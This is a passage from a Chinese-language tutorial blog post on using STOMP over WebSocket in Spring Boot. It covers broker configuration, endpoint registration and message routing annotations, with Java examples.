<p>服务器（或 Broker）看到 <code>SEND</code> 和 <code>destination</code> 就立刻明白了消息的目的地和意图，无需再解析消息体来做路由判断。</p>
</li>
</ul>
<hr>
<h3 id="1-2-没有内置的发布-订阅（Pub-Sub）和路由机制"><a href="#1-2-没有内置的发布-订阅（Pub-Sub）和路由机制" class="headerlink" title="1.2 没有内置的发布&#x2F;订阅（Pub&#x2F;Sub）和路由机制"></a>1.2 没有内置的发布&#x2F;订阅（Pub&#x2F;Sub）和路由机制</h3><ul>
<li><p><strong>原生 WebSocket 的困境</strong>：如果要实现一个聊天室，你需要手动维护一个映射关系，比如 <code>Map&lt;String, Set&lt;Session&gt;&gt;</code>，其中 Key 是聊天室 ID，Value 是该聊天室中所有用户的 WebSocket <code>Session</code> 集合。当收到一条发往该聊天室的消息时，你需要：</p>
<ol>
<li>从 Map 中找到对应的 <code>Set&lt;Session&gt;</code>。</li>
<li>遍历这个 Set。</li>
<li>对每一个 <code>Session</code> 调用 <code>session.getBasicRemote().sendText(...)</code>。<br>这个过程完全是手动编码，容易出错且难以扩展。</li>
</ol>
</li>
<li><p><strong>STOMP 的解决方案</strong>：STOMP 的核心就是<strong>基于“目的地”（Destination）的路由</strong>。它天然支持两种主流的消息模型：</p>
<ul>
<li><strong>发布&#x2F;订阅（Topics）</strong>：通常以 <code>/topic/</code> 开头。一个消息被发送到 <code>/topic/news</code>，所有订阅了该主题的客户端都会收到这个消息。非常适合广播场景，如股票行情、在线状态更新、公共聊天室。</li>
<li><strong>点对点（Queues）</strong>：通常以 <code>/queue/</code> 或 <code>/user/</code> 开头。一个消息被发送到队列，只有一个消费者（订阅者）会收到并处理它。非常适合任务处理、私聊消息等。</li>
</ul>
<p>开发者只需要让客户端 <code>SUBSCRIBE</code> 到某个 destination，然后向这个 destination <code>SEND</code> 消息即可。Spring 的 STOMP 支持会自动将消息路由给所有正确的订阅者，完全解耦了消息的生产者和消费者。</p>
</li>
</ul>
<hr>
<h3 id="1-3-缺乏高级消息特性"><a href="#1-3-缺乏高级消息特性" class="headerlink" title="1.3 缺乏高级消息特性"></a>1.3 缺乏高级消息特性</h3><ul>
<li><strong>原生 WebSocket 的困境</strong>：像消息确认（ACK）、事务、回执等企业级消息队列（MQ）中的常见功能，原生 WebSocket 均不提供。如果需要确保消息被客户端成功处理，你必须自己设计一套复杂的回执和重发机制。</li>
<li><strong>STOMP 的解决方案</strong>：STOMP 协议的设计深受传统 MQ 的影响，它支持更丰富的交互模式。例如，客户端可以在 <code>SUBSCRIBE</code> 时指定 <code>ack</code> 模式（<code>auto</code>, <code>client</code>, <code>client-individual</code>），从而实现消息的可靠消费。服务器发送消息后，需要等待客户端发回 <code>ACK</code> 或 <code>NACK</code> 帧，才能决定是否将消息从队列中移除。</li>
</ul>
<hr>
<h3 id="1-4-总结与类比"><a href="#1-4-总结与类比" class="headerlink" title="1.4 总结与类比"></a>1.4 总结与类比</h3><p>一个绝佳的类比是 <strong>HTTP 与 TCP</strong> 的关系：</p>
<ul>
<li><strong>WebSocket 就像 TCP</strong>：它提供了可靠的、双向的字节流传输通道。它很底层，很纯粹，给了你最大的灵活性，但也意味着你需要自己构建上层的一切。</li>
<li><strong>STOMP over WebSocket 就像 HTTP over TCP</strong>：它在底层的通道之上，定义了一套标准的、语义化的通信规则（命令、头信息、目的地）。它让你不再关心底层的字节流，而是专注于“发送一个请求”或“订阅一个资源”这样的业务逻辑。</li>
</ul>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">原生 WebSocket</th>
<th align="left">STOMP over WebSocket</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>抽象层级</strong></td>
<td align="left">传输层协议 (Transport-level)</td>
<td align="left">应用层协议 (Application-level)</td>
</tr>
<tr>
<td align="left"><strong>消息格式</strong></td>
<td align="left">无规定，通常是自定义 JSON&#x2F;XML</td>
<td align="left">标准化帧 (Frame)，包含命令、头部、内容</td>
</tr>
<tr>
<td align="left"><strong>路由</strong></td>
<td align="left">手动实现，管理 Session 集合</td>
<td align="left">基于 “Destination” 的自动路由</td>
</tr>
<tr>
<td align="left"><strong>消息模型</strong></td>
<td align="left">无内置模型，需手动实现</td>
<td align="left">内置 Pub&#x2F;Sub (<code>/topic</code>) 和 P2P (<code>/queue</code>)</td>
</tr>
<tr>
<td align="left"><strong>高级特性</strong></td>
<td align="left">无 (如 ACK, 事务)</td>
<td align="left">支持 (ACK, NACK, 事务等)</td>
</tr>
<tr>
<td align="left"><strong>开发复杂度</strong></td>
<td align="left">较高，需要处理大量底层细节</td>
<td align="left">较低，专注于业务逻辑和消息目的地</td>
</tr>
</tbody></table>
<p><strong>结论：</strong></p>
<p>虽然对于极简的场景，原生 WebSocket 已经足够，但只要你的应用涉及到任何形式的广播、路由、分类消息或需要与消息队列类似的行为时，<strong>使用 STOMP 就能极大地简化你的服务器和客户端代码，提供更健壮、更具扩展性的消息处理架构。</strong> Spring 对 STOMP 的完美支持更是让这一切变得唾手可得。</p>
<hr>
<h2 id="2-Spring-STOMP-核心配置"><a href="#2-Spring-STOMP-核心配置" class="headerlink" title="2. Spring STOMP 核心配置"></a>2. Spring STOMP 核心配置</h2><p>当你在 Spring Boot 项目中引入 <code>spring-boot-starter-websocket</code> 依赖后，Spring 的自动配置机制就已经为 WebSocket 和 STOMP 准备好了基础环境。我们接下来的配置，就是通过实现 <code>WebSocketMessageBrokerConfigurer</code> 接口，来定制和覆盖这些默认行为，使其符合我们的业务需求。</p>
<p>这整个配置可以看作是在绘制一张<strong>消息流转的蓝图</strong>。</p>
<h3 id="2-1-EnableWebSocketMessageBroker"><a href="#2-1-EnableWebSocketMessageBroker" class="headerlink" title="2.1 @EnableWebSocketMessageBroker"></a>2.1 <code>@EnableWebSocketMessageBroker</code></h3><p>这是一个核心注解，通常放在一个 <code>@Configuration</code> 类上。它不仅仅是一个开关，它的作用是<strong>启用 Spring 的 WebSocket 消息代理功能</strong>。</p>
<p>当 Spring 容器扫描到这个注解时，它会：</p>
<ol>
<li><strong>创建和注册处理 WebSocket 消息的核心组件 (Bean)</strong>。其中最重要的两个是：<ul>
<li>一个负责接收和解析客户端消息，并将其路由到 <code>@MessageMapping</code> 或 <code>@SubscribeMapping</code> 注解的方法。</li>
<li>另一个是内置的消息代理（Message Broker），用于处理订阅和广播。</li>
</ul>
</li>
<li><strong>使得 <code>WebSocketMessageBrokerConfigurer</code> 的配置生效</strong>。没有这个注解，你实现的配置类将不会被 Spring 用来配置 STOMP。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">// 开启STOMP协议的WebSocket消息代理支持</span></span><br><span class="line"><span class="meta">@EnableWebSocketMessageBroker</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketConfig</span> <span class="keyword">implements</span> <span class="title class_">WebSocketMessageBrokerConfigurer</span> &#123;</span><br><span class="line">    <span class="comment">// ... 配置方法将在这里实现</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-2-WebSocketMessageBrokerConfigurer-接口详解"><a href="#2-2-WebSocketMessageBrokerConfigurer-接口详解" class="headerlink" title="2.2 WebSocketMessageBrokerConfigurer 接口详解"></a>2.2 <code>WebSocketMessageBrokerConfigurer</code> 接口详解</h3><p>这个接口提供了多个 <code>default</code> 方法，我们只需要重写需要定制的部分即可。最核心的是以下两个方法：</p>
<h4 id="2-2-1-registerStompEndpoints-StompEndpointRegistry-registry"><a href="#2-2-1-registerStompEndpoints-StompEndpointRegistry-registry" class="headerlink" title="2.2.1 registerStompEndpoints(StompEndpointRegistry registry)"></a>2.2.1 <code>registerStompEndpoints(StompEndpointRegistry registry)</code></h4><ul>
<li><strong>作用</strong>：注册 STOMP “端点” (Endpoint)。</li>
<li><strong>什么是端点？</strong> 这是 WebSocket 或 SockJS 客户端为了进行 WebSocket 握手而需要连接的 <strong>HTTP URL</strong>。可以把它理解为 WebSocket 服务的**“入口”<strong>或</strong>“接入点”**。</li>
<li><strong>核心代码与解释</strong>：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerStompEndpoints</span><span class="params">(StompEndpointRegistry registry)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 注册一个名为 &quot;/ws-stomp&quot; 的 STOMP 端点。</span></span><br><span class="line">    <span class="comment">//    客户端将连接到 &quot;ws://localhost:8080/ws-stomp&quot;</span></span><br><span class="line">    <span class="type">StompEndpointRegistration</span> <span class="variable">endpoint</span> <span class="operator">=</span> registry.addEndpoint(<span class="string">&quot;/ws-stomp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. setAllowedOrigins(&quot;*&quot;)：解决跨域问题。允许所有域的客户端连接。</span></span><br><span class="line">    <span class="comment">//    在生产环境中，应该指定具体的域名，如 &quot;https://example.com&quot;。</span></span><br><span class="line">    endpoint.setAllowedOrigins(<span class="string">&quot;*&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. withSockJS()：启用 SockJS 后备选项。</span></span><br><span class="line">    <span class="comment">//    如果浏览器不支持 WebSocket，SockJS 会自动降级为其他通信方式（如 HTTP Polling）。</span></span><br><span class="line">    <span class="comment">//    这极大地提高了应用的兼容性。客户端也需要使用 SockJS 库。</span></span><br><span class="line">    endpoint.withSockJS();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>小结</strong>：这个方法定义了<strong>客户端如何连接到我们的服务</strong>。你可以注册多个端点，用于不同场景或不同类型的客户端。</li>
</ul>
<hr>
<h4 id="2-2-2-configureMessageBroker-MessageBrokerRegistry-registry"><a href="#2-2-2-configureMessageBroker-MessageBrokerRegistry-registry" class="headerlink" title="2.2.2 configureMessageBroker(MessageBrokerRegistry registry)"></a>2.2.2 <code>configureMessageBroker(MessageBrokerRegistry registry)</code></h4><ul>
<li><strong>作用</strong>：配置消息代理（Message Broker），它是 STOMP 消息处理的<strong>核心</strong>，负责<strong>路由、存储和广播消息</strong>。</li>
<li><strong>核心概念：消息流转路径</strong><ul>
<li><strong>发往应用 (Application)</strong>：客户端发送的消息，需要经过服务器端的 <code>@MessageMapping</code> 方法处理。这些消息的目的地通常有一个特定的前缀，如 <code>/app</code>。</li>
<li><strong>发往代理 (Broker)</strong>：消息直接由代理进行广播，无需应用层代码处理。这些消息的目的地前缀通常是 <code>/topic</code> (发布&#x2F;订阅) 或 <code>/queue</code> (点对点)。</li>
</ul>
</li>
<li><strong>核心代码与解释</strong>：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureMessageBroker</span><span class="params">(MessageBrokerRegistry registry)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 配置应用程序目标前缀 (Application Destination Prefix)</span></span><br><span class="line">    <span class="comment">//    所有目的地以 &quot;/app&quot; 开头的 STOMP 消息都将被路由到 @MessageMapping 注解的方法中。</span></span><br><span class="line">    <span class="comment">//    例如，客户端发送目的地为 &quot;/app/chat&quot; 的消息，将由一个 @MessageMapping(&quot;/chat&quot;) 的方法处理。</span></span><br><span class="line">    registry.setApplicationDestinationPrefixes(<span class="string">&quot;/app&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 配置消息代理 (Message Broker)</span></span><br><span class="line">    <span class="comment">//    这里我们启用一个简单的、基于内存的消息代理。</span></span><br><span class="line">    <span class="comment">//    它将处理目的地以 &quot;/topic&quot; 或 &quot;/queue&quot; 开头的消息。</span></span><br><span class="line">    <span class="comment">//    - &quot;/topic&quot; 通常用于发布/订阅模式（一对多广播）。</span></span><br><span class="line">    <span class="comment">//    - &quot;/queue&quot; 通常用于点对点模式（一对一消息）。</span></span><br><span class="line">    registry.enableSimpleBroker(<span class="string">&quot;/topic&quot;</span>, <span class="string">&quot;/queue&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. (可选) 配置用户目的地前缀 (User Destination Prefix)</span></span><br><span class="line">    <span class="comment">//    当使用 @SendToUser 或 SimpMessagingTemplate.convertAndSendToUser() 时，</span></span><br><span class="line">    <span class="comment">//    Spring 会自动将消息的目的地重写为类似 &quot;/user/&#123;sessionId&#125;/...&quot; 的形式，</span></span><br><span class="line">    <span class="comment">//    确保消息只发送给特定的用户。默认就是 &quot;/user&quot;，一般无需修改。</span></span><br><span class="line">    <span class="comment">//    registry.setUserDestinationPrefix(&quot;/user&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>代理的两种模式：</strong></p>
<ul>
<li><p><strong>简单代理 (Simple Broker)</strong>：<code>enableSimpleBroker()</code></p>
<ul>
<li><strong>特点</strong>：内置，基于内存，无需任何外部依赖。</li>
<li><strong>优点</strong>：配置简单，启动快，非常适合开发、测试和单体小型应用。</li>
<li><strong>缺点</strong>：<ul>
<li>功能有限，不支持复杂的路由和持久化。</li>
<li><strong>无法横向扩展</strong>。如果是多实例部署，一个实例内存中的消息无法被另一个实例的客户端接收到。</li>
<li>服务重启后，所有订阅关系和未发送的消息都会丢失。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>外部代理 (External Broker)</strong>：<code>enableStompBrokerRelay()</code></p>
<ul>
<li><strong>特点</strong>：将消息代理的任务委托给一个专业的外部消息中间件（MQ），如 RabbitMQ, ActiveMQ。Spring 只是作为一个<strong>中继 (Relay)</strong>。</li>
<li><strong>优点</strong>：<ul>
<li><strong>天然支持集群和横向扩展</strong>。</li>
<li><strong>高可用和高可靠</strong>：MQ 通常支持消息持久化、ACK 确认机制等。</li>
<li><strong>功能强大</strong>：支持更复杂的路由拓扑、延迟队列等。</li>
<li><strong>异构系统集成</strong>：其他非 WebSocket 的服务也可以通过 MQ 与你的应用进行消息交互。</li>
</ul>
</li>
<li><strong>配置示例 (RabbitMQ)</strong>：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">registry.enableStompBrokerRelay(<span class="string">&quot;/topic&quot;</span>, <span class="string">&quot;/queue&quot;</span>)</span><br><span class="line">        .setRelayHost(<span class="string">&quot;localhost&quot;</span>)</span><br><span class="line">        .setRelayPort(<span class="number">61613</span>) <span class="comment">// STOMP 插件默认端口</span></span><br><span class="line">        .setClientLogin(<span class="string">&quot;guest&quot;</span>)</span><br><span class="line">        .setClientPasscode(<span class="string">&quot;guest&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-3-总结：一张完整的配置蓝图"><a href="#2-3-总结：一张完整的配置蓝图" class="headerlink" title="2.3 总结：一张完整的配置蓝图"></a>2.3 总结：一张完整的配置蓝图</h3><p>将以上部分组合起来，我们就得到了一个完整的 <code>WebSocketConfig</code> 类，它清晰地定义了整个 STOMP 消息系统的行为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSocketMessageBroker</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketConfig</span> <span class="keyword">implements</span> <span class="title class_">WebSocketMessageBrokerConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 注册 STOMP 协议的端点。</span></span><br><span class="line"><span class="comment">     * 客户端将通过这个端点进行 WebSocket 握手。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerStompEndpoints</span><span class="params">(StompEndpointRegistry registry)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义客户端连接的入口地址 &quot;/ws-stomp&quot;，并开启 SockJS 支持以便在浏览器不支持 WebSocket 时回退</span></span><br><span class="line">        registry.addEndpoint(<span class="string">&quot;/ws-stomp&quot;</span>).setAllowedOrigins(<span class="string">&quot;*&quot;</span>).withSockJS();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 配置消息代理。</span></span><br><span class="line"><span class="comment">     * 定义了消息的路由规则。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureMessageBroker</span><span class="params">(MessageBrokerRegistry registry)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义了服务器处理消息的前缀，发往这些前缀的消息将由 @MessageMapping 方法处理</span></span><br><span class="line">        registry.setApplicationDestinationPrefixes(<span class="string">&quot;/app&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义了消息代理的前缀，发往这些前缀的消息将由消息代理直接路由到订阅者</span></span><br><span class="line">        <span class="comment">// 使用内置的简单代理，处理 &quot;/topic&quot; 和 &quot;/queue&quot;</span></span><br><span class="line">        registry.enableSimpleBroker(<span class="string">&quot;/topic&quot;</span>, <span class="string">&quot;/queue&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这份配置，我们告诉 Spring：</p>
<ol>
<li><strong>入口</strong>：请在 <code>/ws-stomp</code> 这个 URL 上监听 WebSocket 连接请求，并做好兼容性处理 (SockJS)。</li>
<li><strong>分流</strong>：当收到客户端的 STOMP 消息时：<ul>
<li>如果目的地是 <code>/app/xxx</code>，请把它交给我的 Controller (<code>@MessageMapping</code>) 去处理。</li>
<li>如果目的地是 <code>/topic/yyy</code> 或 <code>/queue/zzz</code>，请直接把它广播给所有订阅了这些主题的客户端。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="3-消息收发与路由"><a href="#3-消息收发与路由" class="headerlink" title="3. 消息收发与路由"></a>3. 消息收发与路由</h2><p>在 <code>WebSocketConfig</code> 中配置好“蓝图”后，我们现在需要构建实际的“交通枢纽”和“目的地”。这主要通过在 Controller 中使用一系列注解来完成，其模式与 Spring MVC 的 <code>@RestController</code> 和 <code>@RequestMapping</code> 非常相似。</p>
<p>首先，创建一个用于处理 WebSocket 消息的 Controller：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 @Controller 注解，而非 @RestController。</span></span><br><span class="line"><span class="comment">// 因为我们不是返回 JSON body，而是处理 STOMP 消息。</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketController</span> &#123;</span><br><span class="line">    <span class="comment">// ... 消息处理方法将在这里实现</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="3-1-消息接收：-MessageMapping"><a href="#3-1-消息接收：-MessageMapping" class="headerlink" title="3.1 消息接收：@MessageMapping"></a>3.1 消息接收：<code>@MessageMapping</code></h3><ul>
<li><p><strong>作用</strong>: 这是 STOMP 消息的<strong>主要入口</strong>。它将一个方法映射到一个消息目的地，类似于 <code>@RequestMapping</code> 映射一个 HTTP URL。</p>
</li>
<li><p><strong>工作原理</strong>:</p>
<ol>
<li>客户端使用 STOMP <code>SEND</code> 命令，将消息发送到一个以 <code>/app</code> (我们在配置中定义的应用前缀) 开头的目的地，例如 <code>/app/chat</code>。</li>
<li>Spring 的 STOMP 处理器接收到此消息，剥离 <code>/app</code> 前缀，得到 <code>/chat</code>。</li>
<li>它会在所有 <code>@Controller</code> 中寻找一个被 <code>@MessageMapping(&quot;/chat&quot;)</code> 注解的方法，并将消息的 payload 传递给该方法。</li>
<li>Spring 会自动将 JSON 格式的 payload 反序列化为方法的参数对象（POJO）。</li>
</ol>
</li>
<li><p><strong>示例代码</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设有 ChatMessage 类: &#123; &quot;from&quot;: &quot;userA&quot;, &quot;text&quot;: &quot;hello&quot; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理发往 &quot;/app/chat&quot; 的消息。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> message 客户端发送的 JSON 数据会自动转为 ChatMessage 对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 方法的返回值将作为新消息的 payload</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@MessageMapping(&quot;/chat&quot;)</span> <span class="comment">// 映射目的地 /app/chat</span></span><br><span class="line"><span class="meta">@SendTo(&quot;/topic/public&quot;)</span> <span class="comment">// 将返回值广播到 /topic/public</span></span><br><span class="line"><span class="keyword">public</span> ChatMessage <span class="title function_">handleChatMessage</span><span class="params">(ChatMessage message)</span> &#123;</span><br><span class="line">    <span class="comment">// 在这里可以进行消息处理，如过滤敏感词、存入数据库等</span></span><br><span class="line">    System.out.println(<span class="string">&quot;Received message: &quot;</span> + message.getText());</span><br><span class="line">    <span class="comment">// 方法返回的对象将被序列化为 JSON 并发送出去</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ChatMessage</span>(<span class="string">&quot;Server&quot;</span>, <span class="string">&quot;Processed: &quot;</span> + message.getText());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>客户端交互</strong>: 客户端需要执行 <code>stompClient.send(&quot;/app/chat&quot;, {}, JSON.stringify({from: &#39;Alice&#39;, text: &#39;Hello World!&#39;}));</code></p>
</li>
</ul>
<hr>
<h3 id="3-2-消息发送-广播"><a href="#3-2-消息发送-广播" class="headerlink" title="3.2 消息发送&#x2F;广播"></a>3.2 消息发送&#x2F;广播</h3><h4 id="3-2-1-SendTo：广播到指定目的地"><a href="#3-2-1-SendTo：广播到指定目的地" class="headerlink" title="3.2.1 @SendTo：广播到指定目的地"></a>3.2.1 <code>@SendTo</code>：广播到指定目的地</h4><ul>
<li><p><strong>作用</strong>: 通常与 <code>@MessageMapping</code> 结合使用，用于声明方法返回值的<strong>目标地址</strong>。</p>
</li>
<li><p><strong>工作原理</strong>: 方法执行完毕后，返回值会被发送到 <code>@SendTo</code> 指定的 broker 目的地（如 <code>/topic/public</code>）。然后，消息代理 (Simple Broker) 会将此消息广播给所有订阅了 <code>/topic/public</code> 的客户端。</p>
</li>
<li><p><strong>动态目的地</strong>: <code>@SendTo</code> 的值可以包含占位符，这些占位符会从 <code>@MessageMapping</code> 的路径变量中解析。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 客户端发送到 /app/chat/room123</span></span><br><span class="line"><span class="meta">@MessageMapping(&quot;/chat/&#123;roomId&#125;&quot;)</span></span><br><span class="line"><span class="comment">// 返回值会被广播到 /topic/messages/room123</span></span><br><span class="line"><span class="meta">@SendTo(&quot;/topic/messages/&#123;roomId&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ChatMessage <span class="title function_">handleRoomChat</span><span class="params">(<span class="meta">@DestinationVariable</span> String roomId, ChatMessage message)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> message;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="3-2-2-SendToUser：向当前用户发送私信"><a href="#3-2-2-SendToUser：向当前用户发送私信" class="headerlink" title="3.2.2 @SendToUser：向当前用户发送私信"></a>3.2.2 <code>@SendToUser</code>：向当前用户发送私信</h4><ul>
<li><p><strong>作用</strong>: 将消息只发送给<strong>发起请求的那个用户</strong>。非常适合实现“请求-响应”模式或发送私有错误&#x2F;确认信息。</p>
</li>
<li><p><strong>工作原理</strong>:</p>
<ol>
<li>Spring 会将 <code>@SendToUser</code> 的目的地（如 <code>/queue/errors</code>）转换为一个对该用户唯一的目的地，通常是 <code>/user/{username}/queue/errors</code>。</li>
<li>要使其工作，客户端必须订阅这个<strong>用户特定的</strong>目的地。通常客户端库（如 <code>stomp.js</code>）会简化这个过程，你只需要订阅 <code>/user/queue/errors</code>，库会自动处理底层的会话 ID 映射。</li>
<li>需要结合 Spring Security 或其他认证机制来识别用户 (<code>Principal</code>)。</li>
</ol>
</li>
<li><p><strong>示例代码</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理一个需要私密回复的请求</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> principal Spring Security 注入的当前用户信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@MessageMapping(&quot;/private-request&quot;)</span></span><br><span class="line"><span class="meta">@SendToUser(&quot;/queue/replies&quot;)</span> <span class="comment">// 将返回值发送到 /user/&#123;username&#125;/queue/replies</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">handlePrivateRequest</span><span class="params">(Principal principal)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (principal != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;This is a private reply for &quot;</span> + principal.getName();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Error: User not authenticated.&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>客户端交互</strong>: 客户端需要 <code>stompClient.subscribe(&#39;/user/queue/replies&#39;, callback);</code> 才能收到消息。</p>
</li>
</ul>
<hr>
<h4 id="3-2-3-SimpMessagingTemplate：主动发送消息的“神器”"><a href="#3-2-3-SimpMessagingTemplate：主动发送消息的“神器”" class="headerlink" title="3.2.3 SimpMessagingTemplate：主动发送消息的“神器”"></a>3.2.3 <code>SimpMessagingTemplate</code>：主动发送消息的“神器”</h4><ul>
<li><p><strong>作用</strong>: 让你可以在<strong>任何地方</strong>（<code>@Service</code>, <code>@RestController</code>, 定时任务等），而不仅仅是在 <code>@MessageMapping</code> 方法中，主动向客户端发送消息。</p>
</li>
<li><p><strong>工作原理</strong>: 这是一个可以被 <code>@Autowired</code> 注入的 Bean。你只需调用它的方法，并指定目的地和 payload。</p>
</li>
<li><p><strong>核心方法</strong>:</p>
<ul>
<li><code>convertAndSend(destination, payload)</code>: 发送到一个公共目的地 (如 <code>/topic/notifications</code>)。</li>
<li><code>convertAndSendToUser(user, destination, payload)</code>: 发送给一个特定用户。<code>user</code> 参数是用户名（<code>Principal.getName()</code>）。</li>
</ul>
</li>
<li><p><strong>示例代码</strong>:</p>
